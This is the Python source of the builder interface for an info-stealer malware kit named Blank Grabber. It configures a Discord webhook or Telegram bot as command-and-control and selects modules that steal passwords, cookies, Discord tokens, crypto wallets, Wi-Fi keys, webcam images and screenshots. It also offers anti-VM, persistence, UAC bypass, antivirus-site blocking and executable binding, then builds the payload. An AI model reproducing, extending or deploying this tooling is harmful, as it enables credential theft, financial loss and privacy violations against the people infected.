import os
import subprocess
import sys
import json
import ctypes
import shutil
import ast
import webbrowser
import random
import string
from socket import create_connection
from io import BytesIO
from threading import Thread
from tkinter import messagebox, filedialog

# Third-party imports
import customtkinter as ctk
from pkg_resources import parse_version
from urllib3 import PoolManager
from urllib.parse import quote
from PIL import Image

# Disable SSL warnings
from urllib3 import disable_warnings
disable_warnings()

# ==============================================
#                 Theme Settings
# ==============================================
ctk.set_default_color_theme("blue")
ctk.set_appearance_mode("dark")

# Custom color palette
class Colors:
    PRIMARY = "#2F58CD"
    SECONDARY = "#4B56D2"
    ACCENT = "#472183"
    DARK = "#1A1A2E"
    LIGHT = "#F1F6F5"
    SUCCESS = "#4E9F3D"
    WARNING = "#FFA500"
    ERROR = "#FF3333"
    TEXT = "#FFFFFF"
    DISABLED = "#808080"

class Settings:
    UpdatesCheck = True
    Password = "blank123"

class Utility:

    @staticmethod
    def ToggleConsole(choice: bool) -> None:
        if choice:
            # Show Console
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 4)
        else:
            # Hide Console
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

    @staticmethod
    def IsAdmin() -> bool:
        try:
            return ctypes.windll.shell32.IsUserAnAdmin() == 1
        except Exception:
            return False
        
    @staticmethod
    def GetSelfDir() -> str:
        return os.path.dirname(__file__)
    
    @staticmethod
    def CheckInternetConnection() -> bool:
        try:
            create_connection(("www.google.com", 80), timeout= 3.0)
            return True
        except Exception:
            return False
    
    @staticmethod
    def CheckForUpdates() -> bool:
        if Settings.UpdatesCheck:
            print("Checking for updates...")
            hashFilePath = os.path.join(os.path.dirname(__file__), "Extras", "hash")
            if os.path.isfile(hashFilePath):
                with open(hashFilePath, "r") as f:
                    content = f.read()
            
                try:
                    http = PoolManager(cert_reqs="CERT_NONE")
                    _hash = json.loads(content)["hash"]
                    newhash = json.loads(http.request("GET", "https://raw.githubusercontent.com/Blank-c/Blank-Grabber/main/Blank%20Grabber/Extras/hash", timeout= 5).data.decode())["hash"]

                    os.system("cls")
                    return _hash != newhash # New update available
                except Exception:
                    pass
            os.system("cls")
        return False
    
    @staticmethod
    def CheckConfiguration() -> None:
        configFile = os.path.join(os.path.dirname(__file__), "config.json")
        password = Settings.Password
        updatesCheck = Settings.UpdatesCheck

        if os.path.isfile(configFile):
            with open(configFile, "r") as file:
                config = json.load(file)
                password = config.get("Password", password)
                updatesCheck = config.get("Check for updates", updatesCheck)
        else:
            updatesCheck = not input("Do you want to regularly check for updates? [Y (default)/N]: ").lower().startswith("n")
            _password = input("Enter a new password for the archive (default: %r): " % Settings.Password).strip()
            if _password:
                password = _password
            
        with open(configFile, "w") as file:
            json.dump({
                "Password" : password,
                "Check for updates" : updatesCheck
            }, file, indent= 4, sort_keys= True)
        
        Settings.Password = password
        Settings.UpdatesCheck = updatesCheck

class BuilderOptionsFrame(ctk.CTkFrame):

    def __init__(self, master) -> None:
        super().__init__(master, fg_color= Colors.DARK, corner_radius=10, border_width=2, border_color=Colors.ACCENT)

        self.fakeErrorData = [False, ("", "", 0)] # (Title, Message, Icon)
        self.pumpLimit = 0 # Bytes

        self.grid_propagate(False)

        self.font = ctk.CTkFont(size=12)
        self.title_font = ctk.CTkFont(size=14, weight="bold")

        self.pingMeVar = ctk.BooleanVar(self)
        self.vmProtectVar = ctk.BooleanVar(self)
        self.startupVar = ctk.BooleanVar(self)
        self.meltVar = ctk.BooleanVar(self)
        self.fakeErrorVar = ctk.BooleanVar(self)
        self.blockAvSitesVar = ctk.BooleanVar(self)
        self.discordInjectionVar = ctk.BooleanVar(self)
        self.uacBypassVar = ctk.BooleanVar(self)
        self.pumpStubVar = ctk.BooleanVar(self)

        self.captureWebcamVar = ctk.BooleanVar(self)
        self.capturePasswordsVar = ctk.BooleanVar(self)
        self.captureCookiesVar = ctk.BooleanVar(self)
        self.captureHistoryVar = ctk.BooleanVar(self)
        self.captureAutofillsVar = ctk.BooleanVar(self)
        self.captureDiscordTokensVar = ctk.BooleanVar(self)
        self.captureGamesVar = ctk.BooleanVar(self)
        self.captureWifiPasswordsVar = ctk.BooleanVar(self)
        self.captureSystemInfoVar = ctk.BooleanVar(self)
        self.captureScreenshotVar = ctk.BooleanVar(self)
        self.captureTelegramVar = ctk.BooleanVar(self)
        self.captureCommonFilesVar = ctk.BooleanVar(self)
        self.captureWalletsVar = ctk.BooleanVar(self)
        
        self.boundExePath = ""
        self.boundExeRunOnStartup = False
        self.iconBytes = ""

        self.OutputAsExe = True
        self.ConsoleMode = 0 # 0 = None, 1 = Force, 2 = Debug
        self.C2Mode = 0 # 0 = Discord, 1 = Telegram

        # Configure grid layout
        self.rowconfigure(0, weight=1)  # C2 Entry Row
        self.rowconfigure(1, weight=1)  # First options row
        self.rowconfigure(2, weight=1)  # Second options row
        self.rowconfigure(3, weight=1)  # Third options row
        self.rowconfigure(4, weight=1)  # Fourth options row
        self.rowconfigure(5, weight=1)  # Fifth options row
        self.rowconfigure(6, weight=1)  # Build button row
        
        self.columnconfigure(0, weight=1)
        self.columnconfigure(1, weight=1)
        self.columnconfigure(2, weight=1)
        self.columnconfigure(3, weight=1)
        self.columnconfigure(4, weight=1)
        self.columnconfigure(5, weight=1)

        # ==============================================
        #                 C2 Section
        # ==============================================
        self.c2_frame = ctk.CTkFrame(self, fg_color="transparent")
        self.c2_frame.grid(row=0, column=0, columnspan=6, sticky="nsew", padx=10, pady=(5,5))
        self.c2_frame.columnconfigure(0, weight=5)
        self.c2_frame.columnconfigure(1, weight=1)

        self.C2EntryControl = ctk.CTkEntry(
            self.c2_frame, 
            placeholder_text="Enter Webhook Here", 
            height=30, 
            font=self.font, 
            text_color=Colors.TEXT,
            border_color=Colors.ACCENT,
            fg_color=Colors.DARK
        )
        self.C2EntryControl.grid(row=0, column=0, sticky="ew", padx=(0, 5))

        self.testC2ButtonControl = ctk.CTkButton(
            self.c2_frame, 
            text="Test Webhook", 
            height=30, 
            font=self.font,
            fg_color=Colors.SECONDARY, 
            hover_color=Colors.ACCENT,
            text_color=Colors.TEXT,
            command=lambda: Thread(target=self.testC2ButtonControl_Callback).start()
        )
        self.testC2ButtonControl.grid(row=0, column=1, sticky="ew")

        # ==============================================
        #                 Options Sections
        # ==============================================
        # Create frames for each options column
        self.col1_frame = ctk.CTkFrame(self, fg_color="transparent")
        self.col1_frame.grid(row=1, column=0, rowspan=5, sticky="nsew", padx=2, pady=2)
        
        self.col2_frame = ctk.CTkFrame(self, fg_color="transparent")
        self.col2_frame.grid(row=1, column=1, rowspan=5, sticky="nsew", padx=2, pady=2)
        
        self.col3_frame = ctk.CTkFrame(self, fg_color="transparent")
        self.col3_frame.grid(row=1, column=2, rowspan=5, sticky="nsew", padx=2, pady=2)
        
        self.col4_frame = ctk.CTkFrame(self, fg_color="transparent")
        self.col4_frame.grid(row=1, column=3, rowspan=5, sticky="nsew", padx=2, pady=2)
        
        self.col5_frame = ctk.CTkFrame(self, fg_color="transparent")
        self.col5_frame.grid(row=1, column=4, rowspan=5, sticky="nsew", padx=2, pady=2)
        
        self.col6_frame = ctk.CTkFrame(self, fg_color="transparent")
        self.col6_frame.grid(row=1, column=5, rowspan=5, sticky="nsew", padx=2, pady=2)

        # Column 1 - Basic Options
        ctk.CTkLabel(self.col1_frame, text="Basic Options", font=self.title_font, text_color=Colors.PRIMARY).pack(pady=(0, 5))
        
        self.pingMeCheckboxControl = ctk.CTkCheckBox(
            self.col1_frame, 
            text="Ping Me", 
            font=self.font, 
            height=25, 
            hover_color=Colors.ACCENT,
            text_color=Colors.TEXT,
            text_color_disabled=Colors.DISABLED, 
            variable=self.pingMeVar
        )
        self.pingMeCheckboxControl.pack(fill="x", pady=1)

        self.vmProtectCheckboxControl = ctk.CTkCheckBox(
            self.col1_frame, 
            text="Anti VM", 
            font=self.font, 
            height=25, 
            hover_color=Colors.ACCENT,
            text_color=Colors.TEXT,
            text_color_disabled=Colors.DISABLED, 
            variable=self.vmProtectVar
        )
        self.vmProtectCheckboxControl.pack(fill="x", pady=1)

        self.startupCheckboxControl = ctk.CTkCheckBox(
            self.col1_frame, 
            text="Startup", 
            font=self.font, 
            height=25, 
            hover_color=Colors.ACCENT,
            text_color=Colors.TEXT,
            text_color_disabled=Colors.DISABLED, 
            variable=self.startupVar
        )
        self.startupCheckboxControl.pack(fill="x", pady=1)

        self.meltCheckboxControl = ctk.CTkCheckBox(
            self.col1_frame, 
            text="Melt Stub", 
            font=self.font, 
            height=25, 
            hover_color=Colors.ACCENT,
            text_color=Colors.TEXT,
            text_color_disabled=Colors.DISABLED, 
            variable=self.meltVar
        )
        self.meltCheckboxControl.pack(fill="x", pady=1)

        self.pumpStubCheckboxControl = ctk.CTkCheckBox(
            self.col1_frame, 
            text="Pump Stub", 
            font=self.font, 
            height=25, 
            hover_color=Colors.ACCENT,
            text_color=Colors.TEXT,
            text_color_disabled=Colors.DISABLED, 
            command=self.pumpStub_Event, 
            variable=self.pumpStubVar
        )
        self.pumpStubCheckboxControl.pack(fill="x", pady=1)

        # Column 2 - Stealer Options
        ctk.CTkLabel(self.col2_frame, text="Stealer Options", font=self.title_font, text_color=Colors.PRIMARY).pack(pady=(0, 5))
        
        self.captureWebcamCheckboxControl = ctk.CTkCheckBox(
            self.col2_frame, 
            text="Webcam", 
            font=self.font, 
            height=25, 
            hover_color=Colors.ACCENT,
            text_color=Colors.TEXT,
            text_color_disabled=Colors.DISABLED, 
            variable=self.captureWebcamVar
        )
        self.captureWebcamCheckboxControl.pack(fill="x", pady=1)

        self.capturePasswordsCheckboxControl = ctk.CTkCheckBox(
            self.col2_frame, 
            text="Passwords", 
            font=self.font, 
            height=25, 
            hover_color=Colors.ACCENT,
            text_color=Colors.TEXT,
            text_color_disabled=Colors.DISABLED, 
            variable=self.capturePasswordsVar
        )
        self.capturePasswordsCheckboxControl.pack(fill="x", pady=1)

        self.captureCookiesCheckboxControl = ctk.CTkCheckBox(
            self.col2_frame, 
            text="Cookies", 
            font=self.font, 
            height=25, 
            hover_color=Colors.ACCENT,
            text_color=Colors.TEXT,
            text_color_disabled=Colors.DISABLED, 
            variable=self.captureCookiesVar
        )
        self.captureCookiesCheckboxControl.pack(fill="x", pady=1)

        self.captureHistoryCheckboxControl = ctk.CTkCheckBox(
            self.col2_frame, 
            text="History", 
            font=self.font, 
            height=25, 
            hover_color=Colors.ACCENT,
            text_color=Colors.TEXT,
            text_color_disabled=Colors.DISABLED, 
            variable=self.captureHistoryVar
        )
        self.captureHistoryCheckboxControl.pack(fill="x", pady=1)

        self.captureHistoryCheckboxControl = ctk.CTkCheckBox(
            self.col2_frame, 
            text="Autofills", 
            font=self.font, 
            height=25, 
            hover_color=Colors.ACCENT,
            text_color=Colors.TEXT,
            text_color_disabled=Colors.DISABLED, 
            variable=self.captureAutofillsVar
        )
        self.captureHistoryCheckboxControl.pack(fill="x", pady=1)

        # Column 3 - More Stealer Options
        ctk.CTkLabel(self.col3_frame, text="More Stealer", font=self.title_font, text_color=Colors.PRIMARY).pack(pady=(0, 5))
        
        self.captureDiscordTokensCheckboxControl = ctk.CTkCheckBox(
            self.col3_frame, 
            text="Discord Tokens", 
            font=self.font, 
            height=25, 
            hover_color=Colors.ACCENT,
            text_color=Colors.TEXT,
            text_color_disabled=Colors.DISABLED, 
            variable=self.captureDiscordTokensVar
        )
        self.captureDiscordTokensCheckboxControl.pack(fill="x", pady=1)

        self.captureGamesCheckboxControl = ctk.CTkCheckBox(
            self.col3_frame, 
            text="Games", 
            font=self.font, 
            height=25, 
            hover_color=Colors.ACCENT,
            text_color=Colors.TEXT,
            text_color_disabled=Colors.DISABLED, 
            variable=self.captureGamesVar
        )
        self.captureGamesCheckboxControl.pack(fill="x", pady=1)

        self.captureWalletsCheckboxControl = ctk.CTkCheckBox(
            self.col3_frame, 
            text="Wallets", 
            font=self.font, 
            height=25, 
            hover_color=Colors.ACCENT,
            text_color=Colors.TEXT,
            text_color_disabled=Colors.DISABLED, 
            variable=self.captureWalletsVar
        )
        self.captureWalletsCheckboxControl.pack(fill="x", pady=1)

        self.captureWifiPasswordsCheckboxControl = ctk.CTkCheckBox(
            self.col3_frame, 
            text="Wifi Passwords", 
            font=self.font, 
            height=25, 
            hover_color=Colors.ACCENT,
            text_color=Colors.TEXT,
            text_color_disabled=Colors.DISABLED, 
            variable=self.captureWifiPasswordsVar
        )
        self.captureWifiPasswordsCheckboxControl.pack(fill="x", pady=1)

        # Column 4 - System Options
        ctk.CTkLabel(self.col4_frame, text="System Options", font=self.title_font, text_color=Colors.PRIMARY).pack(pady=(0, 5))
        
        self.captureSysteminfoCheckboxControl = ctk.CTkCheckBox(
            self.col4_frame, 
            text="System Info", 
            font=self.font, 
            height=25, 
            hover_color=Colors.ACCENT,
            text_color=Colors.TEXT,
            text_color_disabled=Colors.DISABLED, 
            variable=self.captureSystemInfoVar
        )
        self.captureSysteminfoCheckboxControl.pack(fill="x", pady=1)

        self.captureScreenshotCheckboxControl = ctk.CTkCheckBox(
            self.col4_frame, 
            text="Screenshot", 
            font=self.font, 
            height=25, 
            hover_color=Colors.ACCENT,
            text_color=Colors.TEXT,
            text_color_disabled=Colors.DISABLED, 
            variable=self.captureScreenshotVar
        )
        self.captureScreenshotCheckboxControl.pack(fill="x", pady=1)

        self.captureTelegramChecboxControl = ctk.CTkCheckBox(
            self.col4_frame, 
            text="Telegram", 
            font=self.font, 
            height=25, 
            hover_color=Colors.ACCENT,
            text_color=Colors.TEXT,
            text_color_disabled=Colors.DISABLED, 
            variable=self.captureTelegramVar
        )
        self.captureTelegramChecboxControl.pack(fill="x", pady=1)

        self.captureCommonFilesChecboxControl = ctk.CTkCheckBox(
            self.col4_frame, 
            text="Common Files", 
            font=self.font, 
            height=25, 
            hover_color=Colors.ACCENT,
            text_color=Colors.TEXT,
            text_color_disabled=Colors.DISABLED, 
            variable=self.captureCommonFilesVar
        )
        self.captureCommonFilesChecboxControl.pack(fill="x", pady=1)

        # Column 5 - Advanced Options
        ctk.CTkLabel(self.col5_frame, text="Advanced Options", font=self.title_font, text_color=Colors.PRIMARY).pack(pady=(0, 5))
        
        self.fakeErrorCheckboxControl = ctk.CTkCheckBox(
            self.col5_frame, 
            text="Fake Error", 
            font=self.font, 
            height=25, 
            hover_color=Colors.ACCENT,
            text_color=Colors.TEXT,
            text_color_disabled=Colors.DISABLED, 
            command=self.fakeError_Event, 
            variable=self.fakeErrorVar
        )
        self.fakeErrorCheckboxControl.pack(fill="x", pady=1)

        self.blockAvSitesCheckboxControl = ctk.CTkCheckBox(
            self.col5_frame, 
            text="Block AV Sites", 
            font=self.font, 
            height=25, 
            hover_color=Colors.ACCENT,
            text_color=Colors.TEXT,
            text_color_disabled=Colors.DISABLED, 
            variable=self.blockAvSitesVar
        )
        self.blockAvSitesCheckboxControl.pack(fill="x", pady=1)

        self.discordInjectionCheckboxControl = ctk.CTkCheckBox(
            self.col5_frame, 
            text="Discord Injection", 
            font=self.font, 
            height=25, 
            hover_color=Colors.ACCENT,
            text_color=Colors.TEXT,
            text_color_disabled=Colors.DISABLED, 
            variable=self.discordInjectionVar
        )
        self.discordInjectionCheckboxControl.pack(fill="x", pady=1)

        self.uacBypassCheckboxControl = ctk.CTkCheckBox(
            self.col5_frame, 
            text="UAC Bypass", 
            font=self.font, 
            height=25, 
            hover_color=Colors.ACCENT,
            text_color=Colors.TEXT,
            text_color_disabled=Colors.DISABLED, 
            variable=self.uacBypassVar
        )
        self.uacBypassCheckboxControl.pack(fill="x", pady=1)

        # Column 6 - Build Controls
        self.C2ModeButtonControl = ctk.CTkButton(
            self.col6_frame, 
            text="C2: Discord", 
            height=25, 
            font=self.font,
            fg_color=Colors.SECONDARY, 
            hover_color=Colors.ACCENT,
            text_color=Colors.TEXT,
            text_color_disabled=Colors.DISABLED, 
            command=self.C2ModeButtonControl_Callback
        )
        self.C2ModeButtonControl.pack(fill="x", pady=2)

        self.bindExeButtonControl = ctk.CTkButton(
            self.col6_frame, 
            text="Bind Executable", 
            height=25, 
            font=self.font,
            fg_color=Colors.SECONDARY, 
            hover_color=Colors.ACCENT,
            text_color=Colors.TEXT,
            text_color_disabled=Colors.DISABLED, 
            command=self.bindExeButtonControl_Callback
        )
        self.bindExeButtonControl.pack(fill="x", pady=2)

        self.selectIconButtonControl = ctk.CTkButton(
            self.col6_frame, 
            text="Select Icon", 
            height=25, 
            font=self.font,
            fg_color=Colors.SECONDARY, 
            hover_color=Colors.ACCENT,
            text_color=Colors.TEXT,
            text_color_disabled=Colors.DISABLED, 
            command=self.selectIconButtonControl_Callback
        )
        self.selectIconButtonControl.pack(fill="x", pady=2)

        self.buildModeButtonControl = ctk.CTkButton(
            self.col6_frame, 
            text="Output: EXE File", 
            height=25, 
            font=self.font,
            fg_color=Colors.SECONDARY, 
            hover_color=Colors.ACCENT,
            text_color=Colors.TEXT,
            text_color_disabled=Colors.DISABLED, 
            command=self.buildModeButtonControl_Callback
        )
        self.buildModeButtonControl.pack(fill="x", pady=2)

        self.consoleModeButtonControl = ctk.CTkButton(
            self.col6_frame, 
            text="Console: None", 
            height=25, 
            font=self.font,
            fg_color=Colors.SECONDARY, 
            hover_color=Colors.ACCENT,
            text_color=Colors.TEXT,
            text_color_disabled=Colors.DISABLED, 
            command=self.consoleModeButtonControl_Callback
        )
        self.consoleModeButtonControl.pack(fill="x", pady=2)

        self.buildButtonControl = ctk.CTkButton(
            self.col6_frame, 
            text="Build", 
            height=25, 
            font=self.font,
            fg_color=Colors.SUCCESS, 
            hover_color="#3D8B37",
            text_color=Colors.TEXT,
            text_color_disabled=Colors.DISABLED, 
            command=self.buildButtonControl_Callback
        )
        self.buildButtonControl.pack(fill="x", pady=2)

    def C2ModeButtonControl_Callback(self) -> None:
        self.focus() # Removes focus from the C2 text box
        DISCORD = "C2: Discord"
        TELEGRAM = "C2: Telegram"

        discordOnlyCheckBoxes = (
            (self.pingMeCheckboxControl, self.pingMeVar),
            (self.discordInjectionCheckboxControl, self.discordInjectionVar)
        )

        if self.C2Mode == 0: # Change to Telegram
            self.C2Mode = 1
            buttonText = TELEGRAM
            self.C2EntryControl.configure(placeholder_text= "Enter Telegram Endpoint: [Telegram Bot Token]$[Telegram Chat ID]")
            self.testC2ButtonControl.configure(text= "Test Endpoint")

            for control, var in discordOnlyCheckBoxes:
                control.configure(state= "disabled")
                var.set(False)

        elif self.C2Mode == 1: # Change to Discord
            self.C2Mode = 0
            buttonText = DISCORD
            self.C2EntryControl.configure(placeholder_text= "Enter Discord Webhook URL")
            self.testC2ButtonControl.configure(text= "Test Webhook")

            for control, _ in discordOnlyCheckBoxes:
                control.configure(state= "normal")

        self.C2ModeButtonControl.configure(text= buttonText)
    
    def bindExeButtonControl_Callback(self) -> None:
        UNBIND = "Unbind Executable"
        BIND = "Bind Executable"

        buttonText = self.bindExeButtonControl.cget("text")

        if buttonText == BIND:
            allowedFiletypes = (("Executable file", "*.exe"),)
            filePath = ctk.filedialog.askopenfilename(title= "Select file to bind", initialdir= ".", filetypes= allowedFiletypes)
            if os.path.isfile(filePath):
                self.boundExePath = filePath
                self.bindExeButtonControl.configure(text= UNBIND)
                if messagebox.askyesno("Bind Executable", "Do you want this bound executable to run on startup as well? (Only works if `Put On Startup` option is enabled)"):
                    self.boundExeRunOnStartup = True
        
        elif buttonText == UNBIND:
            self.boundExePath = ""
            self.boundExeRunOnStartup = False
            self.bindExeButtonControl.configure(text= BIND)
    
    def selectIconButtonControl_Callback(self) -> None:
        UNSELECT = "Unselect Icon"
        SELECT = "Select Icon"

        buttonText = self.selectIconButtonControl.cget("text")

        if buttonText == SELECT:
            allowedFiletypes = (("Image", ["*.ico", "*.bmp", "*.gif", "*.jpeg", "*.png", "*.tiff", "*.webp"]), ("Any file", "*"))
            filePath = ctk.filedialog.askopenfilename(title= "Select icon", initialdir= ".", filetypes= allowedFiletypes)
            if os.path.isfile(filePath):
                try:
                    buffer = BytesIO()
                    with Image.open(filePath) as image:
                        image.save(buffer, format= "ico")

                    self.iconBytes = buffer.getvalue()
                except Exception:
                    messagebox.showerror("Error", "Unable to convert the image to icon!")
                else:
                    self.selectIconButtonControl.configure(text= UNSELECT)
        
        elif buttonText == UNSELECT:
            self.iconBytes = b""
            self.selectIconButtonControl.configure(text= SELECT)
    
    def buildModeButtonControl_Callback(self) -> None:
        EXEMODE = "Output: EXE File"
        PYMODE = "Output:   PY File"

        exeOnlyChecboxControls = (
            (self.fakeErrorCheckboxControl, self.fakeErrorVar),
            (self.startupCheckboxControl, self.startupVar),
            (self.uacBypassCheckboxControl, self.uacBypassVar),
            (self.pumpStubCheckboxControl, self.pumpStubVar),
            (self.bindExeButtonControl, None),
            (self.selectIconButtonControl, None),
        )

        if self.OutputAsExe: # Change to PY mode
            self.OutputAsExe = False
            buttonText = PYMODE

            for control, var in exeOnlyChecboxControls:
                control.configure(state= "disabled")
                if var:
                    var.set(False)
            self.fakeError_Event()
            
            if self.iconBytes:
                self.selectIconButtonControl_Callback() # Remove icon
            
            if self.boundExePath:
                self.bindExeButtonControl_Callback() # Remove bound executable

        else: # Change to EXE mode
            self.OutputAsExe = True
            buttonText = EXEMODE

            for control, _ in exeOnlyChecboxControls:
                control.configure(state= "normal")

        self.buildModeButtonControl.configure(text= buttonText)
    
    def consoleModeButtonControl_Callback(self) -> None:
        CONSOLE_NONE = "Console: None"
        CONSOLE_FORCE = "Console: Force"
        CONSOLE_DEBUG = "Console: Debug"

        if self.ConsoleMode == 0:
            self.ConsoleMode = 1
            buttonText = CONSOLE_FORCE
        elif self.ConsoleMode == 1:
            self.ConsoleMode = 2
            buttonText = CONSOLE_DEBUG
        else:
            self.ConsoleMode = 0
            buttonText = CONSOLE_NONE

        self.consoleModeButtonControl.configure(text= buttonText)
    
    def buildButtonControl_Callback(self) -> None:
        if self.C2Mode == 0:
            webhook = self.C2EntryControl.get().strip()
            if len(webhook) == 0:
                messagebox.showerror("Error", "Webhook cannot be empty!")
                return
            
            if any(char.isspace() for char in webhook):
                messagebox.showerror("Error", "Webhook cannot contain spaces!")
                return
            
            if not webhook.startswith(("http://", "https://")):
                messagebox.showerror("Error", "Invalid protocol for the webhook URL! It must start with either 'http://' or 'https://'.")
                return
        
        elif self.C2Mode == 1:
            endpoint = self.C2EntryControl.get().strip()
            if len(endpoint) == 0:
                    messagebox.showerror("Error", "Endpoint cannot be empty!")
                    return

            if any(char.isspace() for char in endpoint):
                messagebox.showerror("Error", "Endpoint cannot contain spaces!")
                return
            
            if any(char in ("[", "]") for char in endpoint):
                messagebox.showerror("Error", "You do not have to include the brackets in the endpoint!")
                return

            if not endpoint.count("$") == 1:
                messagebox.showerror("Error", "Invalid format! Endpoint must be your Telegram bot token and chat ID separated by a single '$' symbol.")
                return
            
            token, chat_id = [i.strip() for i in endpoint.split("$")]

            if not token:
                messagebox.showerror("Error", "Bot token cannot be empty!")
                return
            
            if chat_id:
                if not chat_id.lstrip("-").isdigit() and chat_id.count("-") <= 1:
                    messagebox.showerror("Error", "Invalid chat ID! Chat ID must be a number.")
                    return
            else:
                messagebox.showerror("Error", "Chat ID cannot be empty!")
                return
        
        if not Utility.CheckInternetConnection():
            messagebox.showwarning("Warning", "Unable to connect to the internet!")
            return
        
        if not any([
            self.captureWebcamVar.get(), self.capturePasswordsVar.get(), self.captureCookiesVar.get(), 
            self.captureHistoryVar.get(), self.captureDiscordTokensVar.get(), self.captureGamesVar.get(), 
            self.captureWalletsVar.get(), self.captureWifiPasswordsVar.get(), self.captureSystemInfoVar.get(), 
            self.captureScreenshotVar.get(), self.captureTelegramVar.get(), self.captureCommonFilesVar.get(),
            self.captureAutofillsVar.get(),
            ]):
            messagebox.showwarning("Warning", "You must select at least one of the stealer modules!")
            return
        
        config= {
            "settings" : {
                "c2" : [self.C2Mode, self.C2EntryControl.get().strip()],
                "mutex" : "".join(random.choices(string.ascii_letters + string.digits, k= 16)),
                "pingme" : self.pingMeVar.get(),
                "vmprotect" : self.vmProtectVar.get(),
                "startup" : self.startupVar.get(),
                "melt" : self.meltVar.get(),
                "uacBypass" : self.uacBypassVar.get(),
                "archivePassword" : Settings.Password,
                "consoleMode" : self.ConsoleMode,
                "debug" : self.ConsoleMode == 2,
                "pumpedStubSize" : self.pumpLimit,
                "boundFileRunOnStartup" : self.boundExeRunOnStartup,
            },
    
            "modules" : {
                "captureWebcam" : self.captureWebcamVar.get(),
                "capturePasswords" : self.capturePasswordsVar.get(),
                "captureCookies" : self.captureCookiesVar.get(),
                "captureHistory" : self.captureHistoryVar.get(),
                "captureAutofills" : self.captureAutofillsVar.get(),
                "captureDiscordTokens" : self.captureDiscordTokensVar.get(),
                "captureGames" : self.captureGamesVar.get(),
                "captureWifiPasswords" : self.captureWifiPasswordsVar.get(),
                "captureSystemInfo" : self.captureSystemInfoVar.get(),
                "captureScreenshot" : self.captureScreenshotVar.get(),
                "captureTelegramSession" : self.captureTelegramVar.get(),
                "captureCommonFiles" : self.captureCommonFilesVar.get(),
                "captureWallets" : self.captureWalletsVar.get(),

                "fakeError" : self.fakeErrorData,
                "blockAvSites" : self.blockAvSitesVar.get(),
                "discordInjection" : self.discordInjectionVar.get()
            }
        }

        configData = json.dumps(config, indent= 4)

        if self.OutputAsExe:
            self.master.BuildExecutable(configData, self.iconBytes, self.boundExePath)
        else:
            self.master.BuildPythonFile(configData)
            
    def testC2ButtonControl_Callback(self) -> None:
        self.C2EntryControl.configure(state= "disabled")
        self.C2ModeButtonControl.configure(state= "disabled")
        self.buildButtonControl.configure(state= "disabled")

        def check():
            http = PoolManager(cert_reqs="CERT_NONE")
            if self.C2Mode == 0:
                webhook = self.C2EntryControl.get().strip()
                if len(webhook) == 0:
                    messagebox.showerror("Error", "Webhook cannot be empty!")
                    return
                
                if any(char.isspace() for char in webhook):
                    messagebox.showerror("Error", "Webhook cannot contain spaces!")
                    return
                
                if not webhook.startswith(("http://", "https://")):
                    messagebox.showerror("Error", "Invalid protocol for the webhook URL! It must start with either 'http://' or 'https://'.")
                    return
                
                elif not "discord" in webhook:
                    messagebox.showwarning("Warning", "Webhook does not seems to be a Discord webhook!")
                    return
                
                elif not Utility.CheckInternetConnection():
                    messagebox.showwarning("Warning", "Unable to connect to the internet!")
                    return
                

                try:
                    data = json.dumps({"content" : "Your webhook is working!"}).encode()
                    http = http.request("POST", webhook, body= data, headers= {"Content-Type" : "application/json", "user-agent" : "Mozilla/5.0 (Linux; Android 10; SM-T510 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Safari/537.36"})
                    status = http.status
                    if status == 204:
                        messagebox.showinfo("Success", "Your webhook seems to be working!")
                    else:
                        messagebox.showwarning("Warning", "Your webhook does not seems to be working!")
                except Exception:
                    messagebox.showwarning("Warning", "Unable to connect to the webhook!")
            
            elif self.C2Mode == 1:
                endpoint = self.C2EntryControl.get().strip()
                if len(endpoint) == 0:
                    messagebox.showerror("Error", "Endpoint cannot be empty!")
                    return

                if any(char.isspace() for char in endpoint):
                    messagebox.showerror("Error", "Endpoint cannot contain spaces!")
                    return
                
                if any(char in ("[", "]") for char in endpoint):
                    messagebox.showerror("Error", "You do not have to include the brackets in the endpoint!")
                    return

                if not endpoint.count("$") == 1:
                    messagebox.showerror("Error", "Invalid format! Endpoint must be your Telegram bot token and chat ID separated by a single '$' symbol.")
                    return
                
                token, chat_id = [i.strip() for i in endpoint.split("$")]

                if token:
                    try:
                        resp = json.loads(http.request("GET", "https://api.telegram.org/bot%s/getUpdates" % token).data.decode())
                        if not resp["ok"]:
                            messagebox.showerror("Error", "Invalid bot token!")
                            return
                    except Exception as e:
                        print(e)
                        messagebox.showerror("Error", "Unable to connect to the Telegram API!")
                        return
                else:
                    messagebox.showerror("Error", "Bot token cannot be empty!")
                    return
                
                if chat_id:
                    if not chat_id.lstrip("-").isdigit() and chat_id.count("-") <= 1:
                        messagebox.showerror("Error", "Invalid chat ID! Chat ID must be a number.")
                        return
                    else:
                        try:
                            resp = json.loads(http.request("GET", "https://api.telegram.org/bot%s/getChat?chat_id=%s" % (token, chat_id)).data.decode())
                            if not resp["ok"]:
                                messagebox.showerror("Error", "Invalid chat ID!\n\nCommon fixes:\n\n1) If the chat ID is of a user, then make sure the user have has sent at least one message to the bot.\n2) If the chat ID is of a channel, then make sure you have has sent at least one message in the channel after the bot joined.\n3) If the chat ID is of a group, then make sure the bot is a member of the group.")
                                return
                            else:
                                if resp["result"].get("permissions"):
                                    if not resp["result"]["permissions"]["can_send_documents"] or not resp["result"]["permissions"]["can_send_messages"]:
                                        messagebox.showerror("Error", "The bot does not have the required permissions to send files and messages to the chat!")
                                        return

                        except Exception as e:
                            print(e)
                            messagebox.showerror("Error", "Unable to connect to the Telegram API!")
                            return
                else:
                    messagebox.showerror("Error", "Chat ID cannot be empty!")
                    return
                
                if not Utility.CheckInternetConnection():
                    messagebox.showwarning("Warning", "Unable to connect to the internet!")
                    return
                
                try:
                    http = PoolManager(cert_reqs="CERT_NONE")
                    if http.request("GET", "https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s" % (token, chat_id, quote("Your endpoint is working!"))).status == 200:
                        messagebox.showinfo("Success", "Your endpoint seems to be working!")
                        return
                except Exception as e:
                    print(e)
                    messagebox.showwarning("Warning", "Unable to connect to the endpoint!")
                    return
        
        check()
        self.buildButtonControl.configure(state= "normal")
        self.C2ModeButtonControl.configure(state= "normal")
        self.C2EntryControl.configure(state= "normal")
    
    def fakeError_Event(self) -> None:
        if not self.fakeErrorVar.get():
            self.fakeErrorData = [False, ("", "", 0)]
        else:
            fakeErrorBuilder = FakeErrorBuilder(self)
            self.wait_window(fakeErrorBuilder)
